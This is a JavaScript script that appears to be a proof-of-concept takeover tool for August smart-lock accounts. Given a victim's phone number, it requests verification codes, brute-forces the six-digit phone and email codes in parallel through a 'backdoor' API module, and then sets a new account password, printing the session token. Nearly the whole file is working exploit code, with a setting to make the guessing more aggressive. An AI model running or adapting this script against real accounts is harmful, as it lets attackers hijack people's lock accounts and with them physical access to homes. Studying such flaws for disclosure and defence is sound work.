var Session = require('./august_api/session');
var auth = require('./august_api/authentication');
var backdoor = require('./august_api/backdoor')
var async = require('async');
var Promise = require('promise');

var phone = '12225554444'; //Put the phone number of an August User here format:12225554444
var email = 'your@email.com';
var newPassword = 'YourNewPword';

var crackSpeed = 1; // increase to be more agressive.

var seriesWorker = function seriesWorker(low, high, work, isDone){
	return new Promise(function(fulfill){
		var c = low;
		if(isDone() || low >= high) {
			fulfill();
			return;
		}
		work(c).then(function() {
			return seriesWorker(c+1, high, work, isDone).then(fulfill);
		});
	});
};

function pfor(l, h, p, work, result) {
	var delta = h-l;
	var increment = delta / p;
	var workers = [];

	for (var i = 0; i < p; i++) {
		var nl = l+i*increment;
		var max = nl + increment;
		if(p==i) {
			max = h;
		}
		workers.push(seriesWorker(nl, max, work, result));
	}

	return Promise.all(workers).then(function (){
		return result();
	});
};

var brutePhone = function (session, phone) {
	var newSession = undefined;
	console.log("Searching for phone token");
	//Search for a reset code between 000000 and 999,999
	return pfor(0, 1000000, crackSpeed, function(x){
		var c = ("00000"+x);
		c = c.substring(c.length-6, c.length);
		return backdoor.validatePhone(session, c, phone).then(function(session) {
			newSession = session;
			console.log("Was " + c);
		}, function(){
				//console.log("Not " + c);
		});
	},
	function (){
		return newSession;
	});
};

var bruteEmail = function (session, email) {
	var newSession = undefined;
	console.log("Searching for email token");
	//Search for a reset code between 000000 and 999,999
	return pfor(0, 1000000, crackSpeed, function(x){
		var c = ("00000"+x);
		c = c.substring(c.length-6, c.length);
		return backdoor.validateEmail(session, c, email).then(function(session) {
			newSession = session;
			console.log("Was " + c);
		}, function(){
			//console.log("Not " + c);
		});
	},
	function (){
		return newSession;
	});
};


var start = new Date().getTime();
auth.authenticate('phone:+'+phone)
	.then(function(session) { 
		if(!session.decodedToken.vPhone){
			return backdoor.sendTokenToPhone(session, phone);;
		} else {
			return session;
		}
	})
	.then(function (session) {
		if(!session.decodedToken.vPhone){
			return brutePhone(session, phone);
		} else {
			return session;
		}
	})
	.then(function(session) {
		if(!session.decodedToken.vEmail){
			return backdoor.sendTokenToEmail(session, email);
		} else {
			return session;
		}
	})
	.then(function (session) {
		if(!session.decodedToken.vEmail){
			return bruteEmail(session, email);
		} else {
			return session;
		}
	})
	.then(function(session){
		return backdoor.changePassword(session, newPassword);
	})
	.then(function(session) {
		var end = new Date().getTime();
			console.log(session.token);
			console.log('New password is: ' + newPassword);
			console.log('Finished in '+ ((end - start)/1000) + 's');
		}, function(x){
			console.error('Error: ', x);
	});

